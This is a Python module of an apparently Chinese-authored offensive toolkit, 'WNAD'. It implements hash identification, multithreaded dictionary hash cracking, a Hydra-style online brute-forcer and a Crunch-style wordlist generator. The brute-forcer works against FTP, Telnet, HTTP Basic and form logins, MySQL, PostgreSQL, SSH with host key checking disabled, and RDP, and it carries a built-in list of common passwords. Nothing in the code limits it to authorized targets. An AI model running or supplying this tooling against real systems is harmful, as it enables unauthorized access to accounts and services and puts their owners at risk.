"""
WNAD - 网络密码破解工具 (类 Kali Linux)
纯 Python，跨平台（Windows/Android）
功能: 在线暴力破解 | 哈希破解 | 哈希识别 | 字典生成
"""

import os
import re
import sys
import time
import socket
import base64
import hashlib
import subprocess
import itertools
import threading
import concurrent.futures
from datetime import datetime
from core.utils import C, CHECK, CROSS, INFO, WARN, ARROW, ROOT, print_table, is_windows


# ═══════════════════════════════════════════════
#  1. 哈希识别
# ═══════════════════════════════════════════════

def hash_identify(hash_str: str):
    """识别哈希类型"""
    if not hash_str:
        print(f" {CROSS} 请输入哈希值")
        return

    h = hash_str.strip().lower()
    results = []

    # 长度检测
    hlen = len(h)
    is_hex = all(c in "0123456789abcdef" for c in h)
    prefix = h[:3] if len(h) >= 3 else ""

    rules = [
        (32, True,  "",   "MD5 / MD4 / NTLM / MD5($pass.$pass)"),
        (32, True,  "",   "LM / Oracle 10g"),
        (40, True,  "",   "SHA-1 / RIPEMD-160 / MySQL5 / PostgreSQL"),
        (56, True,  "",   "SHA-224 / SHA3-224"),
        (64, True,  "",   "SHA-256 / SHA3-256 / Blake2s / GOST"),
        (96, True,  "",   "SHA-384 / SHA3-384"),
        (128, True, "",   "SHA-512 / SHA3-512 / Whirlpool / Blake2b"),
        (16, True,  "",   "MySQL 3.x / Cisco PIX / DES(Oracle)"),
        (8, True,   "",   "CRC32 / ADLER32"),
        (60, False, "$2", "bcrypt ($2a$ / $2b$ / $2y$)"),
        (106, False,"$6$", "sha512crypt (Shadow)"),
        (59, False, "$5$", "sha256crypt (Shadow)"),
        (34, False, "$1$", "md5crypt (Shadow)"),
        (20, False, "",    "APR1 / MD5(Unix)"),
    ]

    for length, hex_only, pref, name in rules:
        if hlen == length:
            if hex_only and not is_hex:
                continue
            if pref and not h.startswith(pref):
                continue
            results.append(name)

    if not results:
        if is_hex:
            results.append(f"未知 Hex 哈希 (长度 {hlen})")
        else:
            results.append(f"未知哈希格式 (长度 {hlen})")

    print(f" {INFO} 哈希分析:\n")
    print(f"   哈希:  {C.CYAN}{hash_str}{C.NC}")
    print(f"   长度:  {hlen}")
    print(f"   类型:  {C.CYAN}{', '.join(results)}{C.NC}")
    return results


# ═══════════════════════════════════════════════
#  2. 哈希破解 (字典攻击)
# ═══════════════════════════════════════════════

_HASH_FUNCS = {
    "md5": lambda s: hashlib.md5(s).hexdigest(),
    "sha1": lambda s: hashlib.sha1(s).hexdigest(),
    "sha256": lambda s: hashlib.sha256(s).hexdigest(),
    "sha512": lambda s: hashlib.sha512(s).hexdigest(),
    "ntlm": lambda s: hashlib.new("md4", s).hexdigest(),
}


def crack_hash(hash_str: str, dict_path: str = None, hash_type: str = "md5",
               threads: int = 4, show_progress: bool = True):
    """
    哈希字典破解
    - hash_str: 目标哈希值
    - dict_path: 字典文件路径
    - hash_type: md5/sha1/sha256/sha512/ntlm
    """
    if not hash_str or not dict_path:
        print(f" {CROSS} 用法: wnad crack hash <哈希值> --dict <字典文件> [--type md5]")
        return

    if not os.path.isfile(dict_path):
        print(f" {CROSS} 字典文件不存在: {dict_path}")
        return

    hash_type = hash_type.lower()
    if hash_type not in _HASH_FUNCS:
        print(f" {CROSS} 不支持的哈希类型: {hash_type}")
        print(f" {INFO} 支持: {', '.join(_HASH_FUNCS.keys())}")
        return

    hash_func = _HASH_FUNCS[hash_type]
    target = hash_str.strip().lower()
    found = threading.Event()
    result_word = [None]

    # 读取字典
    try:
        with open(dict_path, "r", encoding="utf-8", errors="ignore") as f:
            words = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except Exception as e:
        print(f" {CROSS} 读取字典失败: {e}")
        return

    print(f" {INFO} 哈希破解: {C.CYAN}{hash_type.upper()}{C.NC}")
    print(f" {INFO} 目标:   {hash_str}")
    print(f" {INFO} 字典:   {dict_path} ({len(words)} 条)")
    print(f" {INFO} 线程:   {threads}\n")

    total = len(words)
    processed = [0]
    lock = threading.Lock()

    def worker(word_chunk):
        for word in word_chunk:
            if found.is_set():
                return
            try:
                h = hash_func(word.encode())
                if h == target:
                    found.set()
                    result_word[0] = word
                    return
            except Exception:
                pass
            with lock:
                processed[0] += 1
                if show_progress and processed[0] % max(1, total // 100) == 0:
                    pct = processed[0] * 100 // total
                    print(f"   {C.DIM}进度: {processed[0]}/{total} ({pct}%){C.NC}")

    chunk_size = max(1, len(words) // threads)
    chunks = [words[i:i+chunk_size] for i in range(0, len(words), chunk_size)]

    threads_list = []
    t0 = time.time()
    for chunk in chunks:
        t = threading.Thread(target=worker, args=(chunk,))
        t.start()
        threads_list.append(t)

    for t in threads_list:
        t.join()

    elapsed = time.time() - t0

    print()
    if result_word[0]:
        print(f" {CHECK} {C.GREEN}密码已找到!{C.NC}")
        print(f"   密码: {C.CYAN}{result_word[0]}{C.NC}")
        print(f"   耗时: {elapsed:.1f}s")
        return result_word[0]
    else:
        print(f" {CROSS} 密码未在字典中找到")
        print(f"   {INFO} 尝试: 换更大的字典 / 调整哈希类型")
        return None


# ═══════════════════════════════════════════════
#  3. 在线暴力破解 (Hydra 风格)
# ═══════════════════════════════════════════════

SERVICE_PORTS = {
    "ssh": 22, "ftp": 21, "telnet": 23, "smtp": 25,
    "http": 80, "https": 443, "mysql": 3306, "postgresql": 5432,
    "rdp": 3389, "pop3": 110, "imap": 143, "mssql": 1433,
}


def _try_ftp(host: str, port: int, user: str, pwd: str, timeout: float) -> bool:
    """FTP 登录尝试"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        banner = s.recv(1024).decode(errors="replace")
        s.send(f"USER {user}\r\n".encode())
        resp = s.recv(1024).decode(errors="replace")
        s.send(f"PASS {pwd}\r\n".encode())
        resp2 = s.recv(1024).decode(errors="replace")
        s.close()
        return "230" in resp2 or "logged" in resp2.lower()
    except Exception:
        return False


def _try_telnet(host: str, port: int, user: str, pwd: str, timeout: float) -> bool:
    """Telnet 登录尝试"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        data = b""
        t0 = time.time()
        while time.time() - t0 < timeout:
            try:
                chunk = s.recv(1024)
                if not chunk:
                    break
                data += chunk
                text = data.decode(errors="replace")
                if "login:" in text.lower() or "username:" in text.lower():
                    s.send(f"{user}\r\n".encode())
                    time.sleep(0.3)
                    data2 = s.recv(4096).decode(errors="replace")
                    if "password:" in data2.lower():
                        s.send(f"{pwd}\r\n".encode())
                        time.sleep(0.3)
                        data3 = s.recv(4096).decode(errors="replace")
                        s.close()
                        return not ("login incorrect" in data3.lower() or
                                   "password incorrect" in data3.lower() or
                                   "failed" in data3.lower())
            except socket.timeout:
                break
        s.close()
    except Exception:
        pass
    return False


def _try_http_basic(host: str, port: int, user: str, pwd: str, timeout: float, ssl: bool = False) -> bool:
    """HTTP Basic Auth 登录尝试"""
    try:
        addr_family = socket.AF_INET
        if ssl:
            try:
                import ssl as ssl_mod
                s = socket.socket(addr_family, socket.SOCK_STREAM)
                s.settimeout(timeout)
                s.connect((host, port))
                s = ssl_mod.wrap_socket(s, server_hostname=host)
            except Exception:
                return False
        else:
            s = socket.socket(addr_family, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, port))

        auth = base64.b64encode(f"{user}:{pwd}".encode()).decode()
        req = f"GET / HTTP/1.0\r\nHost: {host}\r\nAuthorization: Basic {auth}\r\nConnection: close\r\n\r\n"
        s.send(req.encode())
        resp = s.recv(2048).decode(errors="replace")
        s.close()
        return "200 OK" in resp or "401" not in resp
    except Exception:
        return False


def _try_http_post(host: str, port: int, user: str, pwd: str, timeout: float,
                   ssl: bool = False, form_user: str = "username",
                   form_pass: str = "password", login_url: str = "/login") -> bool:
    """HTTP POST 表单登录尝试"""
    try:
        import urllib.parse
        if ssl:
            import ssl as ssl_mod
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, port))
            s = ssl_mod.wrap_socket(s, server_hostname=host)
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, port))

        body = urllib.parse.urlencode({form_user: user, form_pass: pwd})
        req = (f"POST {login_url} HTTP/1.0\r\n"
               f"Host: {host}\r\n"
               f"Content-Type: application/x-www-form-urlencoded\r\n"
               f"Content-Length: {len(body)}\r\n"
               f"Connection: close\r\n\r\n"
               f"{body}")
        s.send(req.encode())
        resp = s.recv(4096).decode(errors="replace")
        s.close()
        # 登录成功通常不返回登录页
        return "200 OK" in resp and "password" not in resp.lower()[:500]
    except Exception:
        return False


def _try_mysql(host: str, port: int, user: str, pwd: str, timeout: float) -> bool:
    """MySQL 登录尝试"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        # MySQL 握手包
        data = s.recv(4096)
        if len(data) < 4:
            s.close()
            return False
        # 构建 MySQL 登录包
        pkt_len = len(data) - 4
        proto = data[4]
        s.close()
        # 尝试用 mysql 命令行（如果安装）
        if is_windows():
            return False  # Windows 无 mysql 客户端
        r = subprocess.run(
            ["mysql", f"-h{host}", f"-P{port}", f"-u{user}", f"-p{pwd}",
             "-e", "SELECT 1", "--connect-timeout=3"],
            capture_output=True, timeout=timeout + 2
        )
        return r.returncode == 0
    except Exception:
        return False


def _try_postgresql(host: str, port: int, user: str, pwd: str, timeout: float) -> bool:
    """PostgreSQL 登录尝试"""
    try:
        if is_windows():
            return False
        r = subprocess.run(
            ["psql", f"postgresql://{user}:{pwd}@{host}:{port}/postgres",
             "-c", "SELECT 1"],
            capture_output=True, timeout=timeout + 2
        )
        return r.returncode == 0
    except Exception:
        return False


def _try_ssh(host: str, port: int, user: str, pwd: str, timeout: float) -> bool:
    """SSH 登录尝试 (需要 sshpass)"""
    try:
        r = subprocess.run(
            ["sshpass", "-p", pwd, "ssh", "-o", "StrictHostKeyChecking=no",
             "-o", f"ConnectTimeout={int(timeout)}",
             f"{user}@{host}", "-p", str(port), "exit"],
            capture_output=True, timeout=timeout + 2
        )
        return r.returncode == 0
    except FileNotFoundError:
        return False
    except Exception:
        return False


def _try_rdp(host: str, port: int, user: str, pwd: str, timeout: float) -> bool:
    """RDP 登录尝试"""
    try:
        r = subprocess.run(
            ["xfreerdp", f"/v:{host}:{port}", f"/u:{user}", f"/p:{pwd}",
             "+auth-only", "--ignore-certificate"],
            capture_output=True, timeout=timeout + 2
        )
        return r.returncode == 0
    except FileNotFoundError:
        return False
    except Exception:
        return False


def crack_hydra(target: str, service: str, user: str = "root",
                dict_path: str = None, threads: int = 5, timeout: float = 5.0,
                ssl: bool = False, form_user: str = "username",
                form_pass: str = "password", login_url: str = "/login"):
    """
    在线暴力破解 (类 Hydra)
    支持: ftp / telnet / http / https / http-post / https-post
    需要外部工具: ssh / mysql / postgresql / rdp
    """
    if not target:
        print(f" {CROSS} 用法: wnad crack hydra <host> --service ftp --user admin --dict passwords.txt")
        return

    # 解析端口
    port = SERVICE_PORTS.get(service.lower(), 22)

    if dict_path and not os.path.isfile(dict_path):
        print(f" {CROSS} 字典文件不存在: {dict_path}")
        return

    # 选择尝试函数
    service_lower = service.lower()
    service_map = {
        "ftp": _try_ftp, "telnet": _try_telnet,
        "http": lambda h, p, u, pw, t: _try_http_basic(h, p, u, pw, t, False),
        "https": lambda h, p, u, pw, t: _try_http_basic(h, p, u, pw, t, True),
        "http-post": lambda h, p, u, pw, t: _try_http_post(h, p, u, pw, t, False, form_user, form_pass, login_url),
        "https-post": lambda h, p, u, pw, t: _try_http_post(h, p, u, pw, t, True, form_user, form_pass, login_url),
        "mysql": _try_mysql, "postgresql": _try_postgresql,
        "ssh": _try_ssh, "rdp": _try_rdp,
    }

    try_func = service_map.get(service_lower)
    if not try_func:
        print(f" {CROSS} 不支持的服务: {service}")
        print(f" {INFO} 支持: {', '.join(service_map.keys())}")
        return

    print(f" {ROOT} {C.RED}在线暴力破解{C.NC}")
    print(f" {INFO} 目标:   {C.CYAN}{target}:{port}{C.NC}")
    print(f" {INFO} 服务:   {service}")
    print(f" {INFO} 用户:   {user}")
    print(f" {INFO} 线程:   {threads}")

    if dict_path:
        try:
            with open(dict_path, "r", encoding="utf-8", errors="ignore") as f:
                passwords = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        except Exception as e:
            print(f" {CROSS} 读取字典失败: {e}")
            return
    else:
        passwords = _gen_common_passwords()
        print(f" {INFO} 字典:   内建常用密码 ({len(passwords)} 条)")

    print(f" {INFO} 密码数: {len(passwords)}\n")

    found = threading.Event()
    result = [None]
    tried = [0]
    lock = threading.Lock()
    t0 = time.time()

    def worker(pw_chunk):
        for pw in pw_chunk:
            if found.is_set():
                return
            try:
                ok = try_func(target, port, user, pw, timeout)
                with lock:
                    tried[0] += 1
                if ok:
                    found.set()
                    result[0] = (user, pw)
                    return
            except Exception:
                pass
            with lock:
                if tried[0] % 10 == 0:
                    pct = tried[0] * 100 // len(passwords)
                    elapsed = time.time() - t0
                    speed = tried[0] / elapsed if elapsed > 0 else 0
                    eta = (len(passwords) - tried[0]) / speed if speed > 0 else 0
                    print(f"   {C.DIM}进度: {tried[0]}/{len(passwords)} ({pct}%)  {speed:.0f}/s  ETA: {eta:.0f}s{C.NC}")

    chunk_size = max(1, len(passwords) // threads)
    chunks = [passwords[i:i+chunk_size] for i in range(0, len(passwords), chunk_size)]

    threads_list = []
    for chunk in chunks:
        t = threading.Thread(target=worker, args=(chunk,))
        t.start()
        threads_list.append(t)

    for t in threads_list:
        t.join()

    elapsed = time.time() - t0
    print()
    if result[0]:
        print(f" {CHECK} {C.GREEN}登录成功!{C.NC}")
        print(f"   用户名: {C.CYAN}{result[0][0]}{C.NC}")
        print(f"   密码:   {C.CYAN}{result[0][1]}{C.NC}")
        print(f"   耗时:   {elapsed:.1f}s")
    else:
        print(f" {CROSS} 未找到有效密码")
        print(f"   耗时: {elapsed:.1f}s ({tried[0]} / {len(passwords)})")

    return result[0]


def _gen_common_passwords() -> list:
    """内置常用密码表"""
    return [
        "admin", "123456", "password", "12345678", "qwerty",
        "123456789", "12345", "1234", "111111", "1234567",
        "sunshine", "qwerty123", "0", "admin123", "root",
        "administrator", "pass123", "passw0rd", "p@ssw0rd",
        "letmein", "welcome", "monkey", "dragon", "master",
        "login", "abc123", "test", "test123", "guest",
        "123", "password1", "iloveyou", "princess", "rockyou",
        "123123", "654321", "superman", "batman", "hello",
        "charlie", "donald", "trustno1", "football", "baseball",
        "hunter", "ranger", "shadow", "666666", "888888",
    ]


# ═══════════════════════════════════════════════
#  4. 字典生成器 (Crunch 风格)
# ═══════════════════════════════════════════════

def crack_wordlist(output: str = None, charset: str = "0123456789",
                   min_len: int = 1, max_len: int = 4,
                   pattern: str = None, limit: int = 0):
    """
    生成密码字典 (类 Crunch)
    - output: 输出文件 (默认 stdout)
    - charset: 字符集 (默认数字)
    - min_len, max_len: 长度范围
    - pattern: 模式 (如 @@@% 表示 3字母+1数字)
    - limit: 限制条数 (0=不限制)
    """
    CHARSETS = {
        "num": "0123456789",
        "lower": "abcdefghijklmnopqrstuvwxyz",
        "upper": "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
        "alpha": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
        "alnum": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        "full": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?",
        "hex": "0123456789abcdef",
    }

    # 模式转义
    if pattern:
        char_map = {"@": "abcdefghijklmnopqrstuvwxyz",
                    ",": "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
                    "%": "0123456789",
                    ".": "!@#$%^&*()_+-=[]{}|;:,./<>?"}
        charsets = [char_map.get(c, c) for c in pattern]
        total = 1
        for cs in charsets:
            total *= len(cs)
        if limit and total > limit:
            total = limit
    else:
        # 使用字符集
        actual_charset = CHARSETS.get(charset, charset)
        charsets = [actual_charset] * max_len if max_len <= 5 else [actual_charset]
        total = sum(len(actual_charset) ** l for l in range(min_len, max_len + 1))
        if limit:
            total = min(total, limit)

    print(f" {INFO} 字典生成器 (Crunch 风格)")
    print(f" {INFO} 输出:   {output or 'stdout'}")
    if pattern:
        print(f" {INFO} 模式:   {pattern}")
    else:
        print(f" {INFO} 字符集: {charset} ({len(charsets[0])} 字符)")
        print(f" {INFO} 长度:   {min_len} ~ {max_len}")
    print(f" {INFO} 预计:   {total} 条\n")

    if total > 100000:
        print(f" {WARN} 生成 {total} 条密码可能需要较长时间")
        print(f" {INFO} 建议缩小范围或使用 --limit\n")

    out_fd = None
    if output:
        try:
            out_fd = open(output, "w", encoding="utf-8")
        except Exception as e:
            print(f" {CROSS} 无法写入: {e}")
            return

    count = 0
    t0 = time.time()
    try:
        if pattern:
            for combo in itertools.product(*charsets):
                if limit and count >= limit:
                    break
                pw = "".join(combo)
                if out_fd:
                    out_fd.write(pw + "\n")
                else:
                    sys.stdout.write(pw + "\n")
                count += 1
        else:
            actual_charset = CHARSETS.get(charset, charset)
            for length in range(min_len, max_len + 1):
                for combo in itertools.product(actual_charset, repeat=length):
                    if limit and count >= limit:
                        break
                    pw = "".join(combo)
                    if out_fd:
                        out_fd.write(pw + "\n")
                    else:
                        sys.stdout.write(pw + "\n")
                    count += 1
                if limit and count >= limit:
                    break

        elapsed = time.time() - t0
        if out_fd:
            out_fd.close()

        if output:
            size = os.path.getsize(output)
            print(f" {CHECK} 已生成 {count} 条密码 → {C.CYAN}{output}{C.NC} ({size:,} bytes) 耗时 {elapsed:.1f}s")
        else:
            print(f"\n {CHECK} 已输出 {count} 条密码 (stdout) 耗时 {elapsed:.1f}s")

    except KeyboardInterrupt:
        if out_fd:
            out_fd.close()
        print(f"\n {INFO} 已中断，生成 {count} 条")


# ═══════════════════════════════════════════════
#  Main dispatcher
# ═══════════════════════════════════════════════

def crack_main(args):
    """crack 命令主分发"""
    sub = getattr(args, 'sub', '')
    if sub == "identify" or hasattr(args, 'identify') and args.identify:
        hash_str = args.hash_value if hasattr(args, 'hash_value') and args.hash_value else \
                   input(f" {ARROW} 请输入哈希值: ").strip()
        if hash_str:
            hash_identify(hash_str)
        return

    if sub == "hash":
        hash_str = args.hash_value if hasattr(args, 'hash_value') and args.hash_value else ""
        dict_path = args.dict if hasattr(args, 'dict') and args.dict else ""
        hash_type = args.hash_type if hasattr(args, 'hash_type') else "md5"
        crack_hash(hash_str, dict_path, hash_type)
        return

    if sub == "hydra" or sub == "brute":
        target = args.target if hasattr(args, 'target') else ""
        service = args.service if hasattr(args, 'service') else "ssh"
        user = args.user if hasattr(args, 'user') else "root"
        dict_path = args.dict if hasattr(args, 'dict') and args.dict else ""
        threads = args.threads if hasattr(args, 'threads') else 5
        ssl = args.ssl if hasattr(args, 'ssl') else False
        crack_hydra(target, service, user, dict_path, threads)
        return

    if sub == "wordlist":
        output = args.output if hasattr(args, 'output') else ""
        charset = args.charset if hasattr(args, 'charset') else "num"
        min_len = args.min if hasattr(args, 'min') else 1
        max_len = args.max if hasattr(args, 'max') else 4
        pattern = args.pattern if hasattr(args, 'pattern') else None
        limit = args.limit if hasattr(args, 'limit') else 0
        crack_wordlist(output, charset, min_len, max_len, pattern, limit)
        return

    # 默认显示帮助
    print(f" {INFO} crack 子命令:")
    print(f"   {C.CYAN}crack identify <hash>{C.NC}       识别哈希类型")
    print(f"   {C.CYAN}crack hash <hash> --dict <文件>{C.NC}  字典破解哈希")
    print(f"   {C.CYAN}crack hydra <host> --service ftp{C.NC}  在线暴力破解")
    print(f"   {C.CYAN}crack wordlist --charset num{C.NC}      生成密码字典")
